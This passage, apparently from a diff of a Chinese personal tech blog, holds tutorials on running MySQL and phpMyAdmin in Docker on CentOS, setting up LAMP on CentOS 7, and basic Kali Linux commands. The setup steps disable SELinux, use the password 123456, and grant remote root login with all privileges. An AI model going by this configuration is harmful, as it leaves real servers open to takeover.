docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-selinux \</span><br><span class="line">                  docker-engine-selinux \</span><br><span class="line">                  docker-engine \</span><br><span class="line">                  docker-ce</span><br><span class="line">下载</span><br><span class="line">yum install docker-ce -y</span><br></pre></td></tr></table></figure>
+
+<p>输入docker -v 查看docker版本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121193437411.png" alt="image-20231121193437411"></p>
+<p>输入docker images -a 查看所有镜像</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121194338577.png" alt="image-20231121194338577"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3306:3306 -d(如果3306已占用可改为3307)</span><br><span class="line"></span><br><span class="line">docker inspect mysql57</span><br><span class="line">docker exec -it mysql57 bash(进入容器)</span><br><span class="line">mysql -V (查看mysql57是否加进容器)</span><br><span class="line">exit(退出)</span><br><span class="line">docker pull phpmyadmin/phpmyadmin</span><br><span class="line">sudo docker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin</span><br><span class="line">docker images(查看镜像是否有phpmyadmin/phpmyadmin)</span><br></pre></td></tr></table></figure>
+
+<p>登入网页192.168.110.131：9998进入网页，输入用户root，密码123456</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231121195505684.png" alt="image-20231121195505684"></p>
+<h2 id="使用docker"><a href="#使用docker" class="headerlink" title="使用docker"></a>使用docker</h2><ul>
+<li><strong>docker基本命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker version    #查看docker版本</span><br><span class="line">docker cp --help  #帮助信息</span><br><span class="line">docker info       #查看docker系统</span><br><span class="line">docker stats      #查看docker的cpu</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>docker启动和停止</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker    #启动</span><br><span class="line">systemctl stop docker     #停止</span><br><span class="line">systemctl restart docker  #重启</span><br><span class="line">systemctl status docker   #查看docker服务状态</span><br><span class="line">systemctl enable docker   #设置开机启动docker服务</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>镜像命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker images                                 #查看本地存在的镜像</span><br><span class="line">docker images -a                              #查看所有镜像</span><br><span class="line">docker images -aq                             #查看所有镜像，只显示镜像id</span><br><span class="line">docker search mysql                           #在docker远程仓库搜索mysql的镜像</span><br><span class="line">docker search mysql--filter stars=3000        #在docker 远程仓库搜索mysql的镜像，且搜藏大于3000                                                的</span><br><span class="line">docker pull mysql                             #下载mysql镜像默认使用最新版的</span><br><span class="line">docker pull mysql:5.7                         #下载mysql 5.7版本的镜像</span><br><span class="line">docker rmi-f 镜像id                            #通过镜像id 删除镜像docker </span><br><span class="line">docker rmi -f $(docker images -aq)            #删除所有的镜像(递归删除)</span><br></pre></td></tr></table></figure>
+
+<p>REPOSITORY   镜像仓库源</p>
+<p>TAG                  镜像的标签</p>
+<p>IMAGE ID         镜像的id</p>
+<p>CREATED          镜像的创建时间</p>
+<p>SIZE 				  镜像的大小</p>
+<ul>
+<li><strong>容器命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看正在运行的容器docker ps</span><br><span class="line">#查看所有的容器docker ps -a</span><br><span class="line">#查看所有的容器,只显示容器的iddocker ps -aq</span><br><span class="line">#通过容器id 删除容器docker rm容器id</span><br><span class="line">#通过容器id 删除所有的容器docker rm -f $(docker ps -aq)</span><br><span class="line">#通过容器名字启动容器并进入到容器里docker run -it centos(容器名字)/bin/bash</span><br><span class="line">#从容器里退出，回到主机，且停止容器的运行exit</span><br><span class="line">#从容器里退出，回到主机，不停止容器的运行Ctrl + p +q</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>容器启动和停止</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#通过容器id 启动容器 docker start容器id</span><br><span class="line">#通过容器id重新启动容器 docker restart容器id</span><br><span class="line">#通过容器id 停止正在运行的容器 docker stop容器id</span><br><span class="line">#通过容器id 强制停止正在运行的容器 docker kill容器id</span><br><span class="line">#通过镜像的名字的以后台运行的方式进行启动(没有前台服务会停止) docker run -d centos</span><br><span class="line">#以后台方式启动nginx,起名 docker run -d --name nginx001 -p 80:8001 nginx</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>容器信息查看</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看容器的进程信息docker top容器id</span><br><span class="line">#查看容器的元数据(容器的具体信息)docker inspect容器id</span><br><span class="line">#进入正在运行的容器后开启一个新的终端，可以在里面操作docker exec -it 容器id /bin/bash</span><br><span class="line">#进入正在运行的容器后使用正在运行的终端，可以在里面操作docker attach容器id</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/21/%E5%9C%A8centos%E4%B8%AD%E4%BD%BF%E7%94%A8docker/" data-id="clplzuha3000fq8u47z7q2aj1" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-安装centos7并搭建lamp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/20/%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E6%90%AD%E5%BB%BAlamp/" class="article-date">
+  <time class="post-time" datetime="2023-11-20T02:30:42.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">20</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/20/%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E6%90%AD%E5%BB%BAlamp/">安装centos7并搭建lamp</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="安装centos7"><a href="#安装centos7" class="headerlink" title="安装centos7"></a>安装centos7</h2><p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231120201209998.png" alt="image-20231120201209998"></p>
+<p>进入设置密码。</p>
+<p>完成页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231120201415447.png" alt="image-20231120201415447"></p>
+<h2 id="centos7搭建lamp"><a href="#centos7搭建lamp" class="headerlink" title="centos7搭建lamp"></a>centos7搭建lamp</h2><ul>
+<li>rm -f &#x2F;var&#x2F;run&#x2F;yum.pid     清理睡眠状态</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rm -f /var/run/yum.pid</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=<span class="number">3306</span>/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=<span class="number">3306</span>/udp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=<span class="number">80</span>/tcp</span><br><span class="line">firewall-cmd --permanent --zone=public --add-port=<span class="number">80</span>/udp</span><br><span class="line">firewall-cmd --reload</span><br><span class="line">vi /etc/selinux/config      <span class="comment">#将SELINUX=enforcing这一行修改为SELINUX=disabled</span></span><br><span class="line">reboot</span><br><span class="line">yum remove mariadb-libs.x86_64</span><br><span class="line">yum install httpd -y</span><br><span class="line">systemctl enable httpd</span><br><span class="line">systemctl restart httpd</span><br><span class="line">systemctl status httpd</span><br><span class="line">yum -y install mariadb mariadb-server</span><br><span class="line">systemctl enable mariadb</span><br><span class="line">systemctl start mariadb</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>开放防火墙<br>firewall-cmd –permanent –zone&#x3D;public –add-port&#x3D;3306&#x2F;tcp<br>firewall-cmd –permanent –zone&#x3D;public –add-port&#x3D;3306&#x2F;udp<br>firewall-cmd –permanent –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp<br>firewall-cmd –permanent –zone&#x3D;public –add-port&#x3D;80&#x2F;udp<br>firewall-cmd –reload</p>
+</li>
+<li><p>关闭selinux<br>vi &#x2F;etc&#x2F;selinux&#x2F;config<br>将SELINUX&#x3D;enforcing这一行修改为SELINUX&#x3D;disabled</p>
+</li>
+<li><p>reboot （重启）</p>
+</li>
+<li><p>删除默认数据库<br>rpm -qa | grep mariadb 查找出默认数据库mariadb的包名。<br>yum remove mariadb-libs.x86_64    删除</p>
+</li>
+<li><p>yum install httpd -y<br>systemctl enable httpd<br>systemctl restart httpd<br>systemctl status httpd           &#x2F;&#x2F;查看服务状态<br>此时访问成功回显apache测试页，网站根目录&#x2F;var&#x2F;www&#x2F;html</p>
+</li>
+<li><p>安装mysql<br>yum -y install mariadb mariadb-server<br>systemctl enable mariadb<br>systemctl start mariadb<br>mysql_secure_installation</p>
+</li>
+<li><p>Enter current password for root (enter for none):&lt;–初次运行直接回车Set root password? [Y&#x2F;n]&lt;– 是否设置root用户密码，输入y并回车或直接回车<br>New password:&lt;– 设置root用户的密码<br>Re-enter new password:&lt;– 再输入一次你设置的密码<br>其他配置<br>Remove anonymous users? [Y&#x2F;n]&lt;– 是否删除匿名用户，回车<br>Disallow root login remotely? [Y&#x2F;n]&lt;–是否禁止root远程登录,回车,<br>Remove test database and access to it? [Y&#x2F;n]&lt;– 是否删除test数据库，回车<br>Reload privilege tables now? [Y&#x2F;n]&lt;– 是否重新加载权限表，回车<br>初始化MariaDB完成，接下来测试登录<br>mysql -uroot -p你的密码<br>GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘你的密码的明文’ WITH GRANT OPTION;<br>FLUSH PRIVILEGES;                  远程登陆<br>完成。</p>
+</li>
+<li><p>php安装</p>
+</li>
+</ul>
+<ol>
+<li><p>rpm -Uvh <a target="_blank" rel="noopener" href="https://mirror.webtatic.com/yum/el7/webtatic-release.rpm">https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</a> </p>
+</li>
+<li><p>yum -y remove php*</p>
+</li>
+<li><p>yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml</p>
+</li>
+<li><p>systemctl enable php-fpm.service<br>systemctl start php-fpm.service</p>
+</li>
+</ol>
+<ul>
+<li><strong>配置Apache解析php文件并自动关联</strong></li>
+</ul>
+<ol>
+<li><ol>
+<li>vi &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</li>
+<li>找到：DirectoryIndex index.html改为：DirectoryIndex index.html index.htm index.php</li>
+<li>找到：AddType application&#x2F;x-gzip .gz .tgz在该行下面添加：AddType application&#x2F;x-httpd-php .php</li>
+<li>重启Apache：systemctl restart httpd</li>
+<li>在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。</li>
+</ol>
+</li>
+</ol>
+<p>配置完后即可即可在网页打开centos7的ip地址。</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231120111224746.png" alt="image-20231120111224746"></p>
+<p>进入win10的任务管理器</p>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#49;&#x31;&#48;&#46;&#x31;&#51;&#x31;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#49;&#x31;&#48;&#46;&#x31;&#51;&#x31;</a>(远程登入centos7)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231120202757391.png" alt="image-20231120202757391"></p>
+<p>scp -r .\WWW.zip <a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#52;&#50;&#46;&#x31;&#x34;&#51;">&#114;&#111;&#111;&#116;&#x40;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x32;&#52;&#50;&#46;&#x31;&#x34;&#51;</a>:\var\www\html(传送压缩包)</p>
+<p>cd &#x2F;var&#x2F;www&#x2F;html&#x2F;(跳转到&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下)</p>
+<p>unzip WWW.zip(解压WWW.zip)</p>
+<p>打开网页192.168.110.131</p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231120203100637.png" alt="image-20231120203100637"></p>
+<p>即可打开里php文件。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/20/%E5%AE%89%E8%A3%85centos7%E5%B9%B6%E6%90%AD%E5%BB%BAlamp/" data-id="clplzuha4000iq8u40ksu9owu" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-kali-linux的目录结构" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/16/kali-linux%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" class="article-date">
+  <time class="post-time" datetime="2023-11-16T02:04:30.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">16</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/11/16/kali-linux%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/">kali linux的目录结构linux基本操作</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="kali-linux的目录结构"><a href="#kali-linux的目录结构" class="headerlink" title="kali linux的目录结构"></a>kali linux的目录结构</h2><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231116100512889.png" alt="image-20231116100512889"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/：根目录，系统中所有其他目录和文件的起点。</span><br><span class="line">/bin/：二进制可执行文件目录，包含系统启动和运行所需的基本命令。</span><br><span class="line">/boot/：包含启动Linux系统所需的文件，如内核和引导加载程序。</span><br><span class="line">/dev/：设备文件目录，包含与系统中各种设备（硬件和软件）相关的文件。</span><br><span class="line">/etc/：系统配置文件目录，包含系统级别的配置文件，如网络配置、用户账户配置等。</span><br><span class="line">/home/：用户主目录的父目录，每个用户在此目录下拥有一个独立的子目录，用于存储个人文件和设置。</span><br><span class="line">/lib/：库文件目录，包含系统所需的共享库文件。</span><br><span class="line">/media/：可移动媒体设备挂载点目录，用于挂载光盘、U盘等可移动设备。</span><br><span class="line">/mnt/：临时挂载目录，用于挂载其他文件系统或网络共享。</span><br><span class="line">/opt/：可选应用程序目录，用于存放第三方应用程序。</span><br><span class="line">/proc/：虚拟文件系统，包含系统运行时的各种信息。</span><br><span class="line">/root/：超级用户（root）的主目录。</span><br><span class="line">/sbin/：系统管理员命令目录，包含系统管理和维护所需的命令。</span><br><span class="line">/tmp/：临时文件目录，用于存放临时文件。</span><br><span class="line">/usr/：用户程序和文件目录，包含系统范围的应用程序、库文件、文档等。</span><br><span class="line">/var/：可变数据目录，包含经常变化的数据，如日志文件、缓存等。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>处理目录的常用命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls（英文全拼：list files）: 列出目录及文件名</span><br><span class="line">cd（英文全拼：change directory）：切换目录</span><br><span class="line">pwd（英文全拼：print work directory）：显示目前的目录</span><br><span class="line">mkdir（英文全拼：make directory）：创建一个新的目录</span><br><span class="line">rmdir（英文全拼：remove directory）：删除一个空的目录</span><br><span class="line">touch创建空文件</span><br><span class="line">cp（英文全拼：copy file）: 复制文件或目录</span><br><span class="line">rm（英文全拼：remove）: 删除文件或目录</span><br><span class="line">mv（英文全拼：move file）: 移动文件与目录，或修改文件与目录的名称</span><br></pre></td></tr></table></figure>
+
+<p>uname -a查看内核&#x2F;cpu信息</p>
+<p>ls列出目录的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231116145151803.png" alt="image-20231116145151803"></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231116145927092.png" alt="image-20231116145927092"></p>
+<blockquote>
+<p>[注].       当前目录</p>
+<p>​      ..      上一级目录（上上级目录&#x2F;..&#x2F;..&#x2F;）</p>
+<p>​      cd -返回上一次目录</p>
+<p>​      cd ..回到上一级目录</p>
+</blockquote>
+<ul>
+<li><strong>mkdir (创建新目录)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir [-mp] 目录名称</span><br><span class="line">-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～</span><br><span class="line">-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>rmdir (删除空的目录)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir [-p] 目录名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimgimage-20231116150214462.png"></p>
+<ul>
+<li><strong>touch创建空文件</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch 文件名称</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>cp (复制文件或目录)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp 源文件 目标文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231116171636778.png" alt="image-20231116171636778"></p>
+<p>（指将111.txt复制到121.txt中）</p>
+<blockquote>
+<p>-r：递归持续复制，用於目录的复制行为；</p>
+</blockquote>
+<ul>
+<li><strong>rm (移除文件或目录)</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm [-fir] 文件或目录</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[注] -f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</p>
+<p>​       -i ：互动模式，在删除前会询问使用者是否动作</p>
+<p>​       -r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</p>
+</blockquote>
+<ul>
+<li><h3 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv (移动文件与目录，或修改名称)"></a>mv (移动文件与目录，或修改名称)</h3></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv 源文件 目标文件</span><br><span class="line">mv oldNameFile newNameFile(重命名)</span><br><span class="line">mv /temp/movefile/targetFolder（移动文件）</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux文件内容查看"><a href="#Linux文件内容查看" class="headerlink" title="Linux文件内容查看"></a>Linux文件内容查看</h2><ul>
+<li><strong>cat（查看文件内容）</strong></li>
+</ul>
+<p>查看文件内容，从第一行开始显示。</p>
+<p>一般查看较小的文件，一屏幕能显示全的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat -n 文件名（参数显示行号）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>more</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more 要查看的文件</span><br></pre></td></tr></table></figure>
+
+<p>在 more 这个程序的运行过程中，快捷键：</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空白键 (space)</td>
+<td>代表向下翻一页。</td>
+</tr>
+<tr>
+<td>Enter</td>
+<td>代表向下翻『一行』。</td>
+</tr>
+<tr>
+<td>q</td>
+<td>代表立刻离开 more ，不再显示该文件内容。</td>
+</tr>
+<tr>
+<td>ctrl+f</td>
+<td>向下滚动一屏。</td>
+</tr>
+<tr>
+<td>ctrl+b</td>
+<td>返回上一屏。</td>
+</tr>
+<tr>
+<td>&#x3D;</td>
+<td>输出当前行的行号。</td>
+</tr>
+<tr>
+<td>:f</td>
+<td>立刻显示出档名以及目前显示的行数。</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>less</strong></li>
+</ul>
+<p>less指令用来分屏查看文件内容，它的功能与more 指令类似，但是比 more 指令更加强大，支持各种显示终端。less指令在显示文件内容时，并不是一次将整个文件加载之后才显示，而是根据显示需要加载内容，对于显示大型文件具有较高的效率。</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空白键</td>
+<td>向下翻动一页</td>
+</tr>
+<tr>
+<td>[pagedown]</td>
+<td>向下翻动一页</td>
+</tr>
+<tr>
+<td>[pageup]</td>
+<td>向上翻动一页</td>
+</tr>
+<tr>
+<td>&#x2F;字串</td>
+<td>向下搜寻『字串』的功能</td>
+</tr>
+<tr>
+<td>?字串</td>
+<td>向上搜寻『字串』的功能</td>
+</tr>
+<tr>
+<td>q</td>
+<td>离开 less 这个程序</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>echo输出内容到控制台</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo[选项][输出内容]</span><br></pre></td></tr></table></figure>
+
+<p>可以用在写脚本的时候输出日志</p>
+<p>-e：支持反斜线控制的字符转义</p>
+<table>
+<thead>
+<tr>
+<th>控制字符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\</td>
+<td>输出\本身</td>
+</tr>
+<tr>
+<td>\n</td>
+<td>换行符</td>
+</tr>
+<tr>
+<td>\t</td>
+<td>字符表，也就是Tab键</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>tail输出文件尾部内容</strong></li>
+</ul>
+<p>tail 用于输出文件中尾部的内容，默认情况下tail指令显示文件的后10行内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -n 1 文件名 （查看文件尾一行内容）</span><br><span class="line">tail -f 文件名（实时追踪该文档的更新，ctrl+s暂停，ctrl+q继续）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>‘ &gt; ‘输出重定向和 ‘&gt;&gt;’ 追加</strong></li>
+</ul>
+<blockquote>
+<p>将ls查看信息写入到文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 查看的文本 &gt; 要写入的文本</span><br></pre></td></tr></table></figure>
+
+<p>将ls查看信息追加到文本中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls 查看的文本 &gt;&gt; 要追加到的文本</span><br></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li><strong>In软连接</strong></li>
+</ul>
+<p>软链接也称为符号链接，类似于windows里的快捷方式，有自己的数据块，主要存放了链接其他文件的路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s  [原文件或目录]  [软链接名] (功能描述:给原文件创建一个软链接)</span><br><span class="line">rm -rf 软连接名                 (删除软连接名)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>history查看已经执行过的历史命令</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">history （查看历史命令）</span><br><span class="line">history -c （清空历史命令）</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>更改kali的时间</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date 显示时间</span><br><span class="line">date -s &quot;要变化的时间&quot;  更改时间</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用户名@主机名 组成， ~号代表当前目录位置为用户家目录，#号代表管理员用户，普通用户都是$号。</p>
+</blockquote>
+<p>查看主机名hostname</p>
+<p>用户名whoami</p>
+<p>关机操作</p>
+<p>重启命令：</p>
+<p>1、reboot<br>2、shutdown -r now 立刻重启(root用户使用)<br>3、shutdown -r 10 过10分钟自动重启(root用户使用)<br>4、shutdown -r 20:35 在时间为20:35时候重启(root用户使用)<br>如果是通过shutdown命令设置重启的话，可以用shutdown -c命令取消重启<br>关机命令：<br>1、halt   立刻关机<br>2、poweroff  立刻关机<br>3、shutdown -h now 立刻关机(root用户使用)<br>4、shutdown -h 10 10分钟后自动关机<br>如果是通过shutdown命令设置关机的话，可以用shutdown -c命令取消重启</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/11/16/kali-linux%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/" data-id="clplzuh9y0006q8u47e6qc9ix" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-优化页面及文件保密" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/11/15/%E4%BC%98%E5%8C%96%E9%A1%B5%E9%9D%A2%E5%8F%8A%E6%96%87%E4%BB%B6%E4%BF%9D%E5%AF%86/" class="article-date">
+  <time class="post-time" datetime="2023-11-15T07:36:41.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br/>
+    <span class="post-day">15</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
